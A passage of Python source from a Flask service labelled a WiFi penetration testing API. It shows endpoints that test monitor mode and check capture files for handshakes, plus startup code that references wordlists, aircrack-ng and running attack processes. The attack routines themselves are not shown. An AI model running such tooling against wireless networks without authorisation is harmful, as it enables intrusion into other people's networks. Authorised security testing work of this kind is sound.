            return jsonify({"error": "Failed to prepare file for GPU transfer"}), 500
        
    except Exception as e:
        logger.error(f"Manual transfer error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/test_monitor", methods=["POST"])
@require_api_key
def test_monitor_endpoint():
    """Test monitor mode capability via API"""
    try:
        mon_iface = interface_state.get("mon_iface", MON_IFACE)
        logger.info(f"API triggered monitor test for {mon_iface}")
        
        # Run the monitor test
        result = test_monitor_mode_capability(mon_iface)
        
        # Update interface state
        interface_state["monitor_tested"] = result
        interface_state["last_monitor_test"] = time.time()
        
        # Reset to managed mode
        setup_managed_mode(mon_iface)
        
        return jsonify({
            "status": "completed",
            "monitor_working": result,
            "interface": mon_iface,
            "message": "Monitor mode working" if result else "Monitor mode failed - check logs",
            "timestamp": int(time.time())
        }), 200
        
    except Exception as e:
        logger.error(f"Monitor test API error: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/analyze_latest", methods=["GET"])
@require_api_key
def analyze_latest_capture():
    """Analyze the latest capture file"""
    try:
        # Find latest capture file
        cap_files = list(CAP_DIR.glob("*.cap")) + list(CAP_DIR.glob("*.pcap"))
        if not cap_files:
            return jsonify({"error": "No capture files found"}), 404
        
        latest_file = max(cap_files, key=lambda x: x.stat().st_mtime)
        
        # Run analysis
        size = latest_file.stat().st_size
        
        # Basic analysis
        analysis = {
            "filename": latest_file.name,
            "size_bytes": size,
            "timestamp": int(latest_file.stat().st_mtime),
            "analysis": f"File size: {size} bytes"
        }
        
        # Try to get encryption info
        try:
            encryption_info = analyze_encryption_type(str(latest_file))
            analysis["encryption"] = encryption_info
        except:
            analysis["encryption"] = "Analysis failed"
        
        # Try to get packet count
        try:
            packet_info = count_packets_in_capture(str(latest_file))
            analysis["packets"] = packet_info
        except:
            analysis["packets"] = "Count failed"
        
        # Check for handshake
        try:
            handshake_found = validate_handshake(str(latest_file))
            analysis["handshake"] = "Found" if handshake_found else "Not found"
        except:
            analysis["handshake"] = "Check failed"
        
        return jsonify(analysis), 200
        
    except Exception as e:
        logger.error(f"Analysis error: {e}")
        return jsonify({"error": "Internal server error"}), 500

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {error}")
    return jsonify({"error": "Internal server error"}), 500

# -------------- MAIN --------------------
if __name__ == "__main__":
    logger.info("Starting WiFi Penetration Testing API")
    logger.info(f"Configuration: CAP_DIR={CAP_DIR}, TIMEOUT={ATTACK_TIMEOUT_SEC}s")
    
    try:
        # Initialize interfaces and check requirements
        initialize_interfaces()
        logger.info(f"Scan Interface: {interface_state.get('scan_iface')}")
        logger.info(f"Monitor Interface: {interface_state.get('mon_iface')}")
        logger.info(f"Wordlists Available: {len(interface_state.get('wordlists', []))}")
        
        app.run(host="0.0.0.0", port=5000, debug=False)
        
    except Exception as e:
        logger.error(f"Startup error: {e}")
        print(f"ERROR: {e}")
        print("Please check:")
        print("1. aircrack-ng suite is installed: sudo apt install aircrack-ng")
        print("2. Wireless interfaces are available")
        print("3. You have proper permissions")
        exit(1)
    except KeyboardInterrupt:
        logger.info("Server shutdown requested")
    finally:
        # Cleanup on shutdown
        with state_lock:
            if attack_state["running"]:
                kill_process_tree(attack_state["proc_pids"])
        logger.info("Server shutdown complete")
